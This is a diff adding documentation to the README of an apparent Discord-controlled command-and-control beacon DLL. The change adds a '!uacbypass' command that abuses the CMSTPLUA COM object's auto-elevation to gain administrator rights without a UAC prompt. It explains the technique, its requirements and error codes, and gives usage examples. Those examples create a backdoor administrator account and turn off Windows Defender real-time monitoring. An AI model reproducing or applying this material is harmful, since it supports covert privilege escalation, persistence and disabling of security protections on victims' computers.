@@ -16,6 +16,7 @@ Discord-based beacon DLL for the FrameworkC2 project.
 | `shell <cmd>` | Execute PowerShell command |
 | `scr` | Screenshot all monitors |
 | `!loaddll [name]` | Load attached DLL (XOR encrypted) |
+| `!uacbypass [cmd]` | Execute command with elevated privileges (UAC bypass) |
 | `help` | Show available commands |
 
 ## Configuration
@@ -62,6 +63,60 @@ The loader injects beacon.dll into explorer.exe. The beacon:
 rundll32.exe beacon.dll,Start
 rundll32.exe beacon.dll,Run
 ```
+
+## UAC Bypass
+
+The `!uacbypass` command executes commands with elevated (Administrator) privileges without triggering the UAC prompt.
+
+### How it works
+
+Based on [UACME Method 41](https://github.com/hfiref0x/UACME) by Oddvar Moe, this technique abuses the auto-elevation feature of the CMSTPLUA COM object:
+
+1. Windows has a list of "auto-elevated" COM objects that can be instantiated with admin privileges
+2. The CMSTPLUA (Connection Manager) object is in this list
+3. Its ICMLuaUtil interface has a `ShellExec` method that runs commands elevated
+4. We use the COM elevation moniker (`Elevation:Administrator!new:`) to get an elevated interface
+
+### Requirements
+
+- User must be a member of the local Administrators group
+- UAC must be set to "Default" or lower (not "Always Notify")
+- Only works on Windows (Vista and later)
+
+### Usage
+
+```
+# Spawn an elevated cmd.exe window (visible)
+!uacbypass
+
+# Execute a command with elevated privileges (hidden)
+!uacbypass whoami /all
+
+# Add a new admin user
+!uacbypass net user backdoor Password123! /add
+!uacbypass net localgroup administrators backdoor /add
+
+# Disable Windows Defender
+!uacbypass powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
+```
+
+### Limitations
+
+- **No output capture**: The command runs in a separate elevated process. Output is not returned to the beacon.
+- **Workaround**: Redirect output to a file, then read it:
+  ```
+  !uacbypass cmd /c whoami > C:\temp\output.txt
+  shell type C:\temp\output.txt
+  ```
+
+### Error Codes
+
+| Code | Meaning |
+|------|---------|
+| `ComInitFailed` | COM initialization failed |
+| `ElevationFailed` | Could not create elevated COM object (UAC set to Always Notify?) |
+| `ShellExecFailed` | The ShellExec method failed |
+| `InvalidParams` | Invalid command parameters |
 
 ## Loading Additional DLLs
 
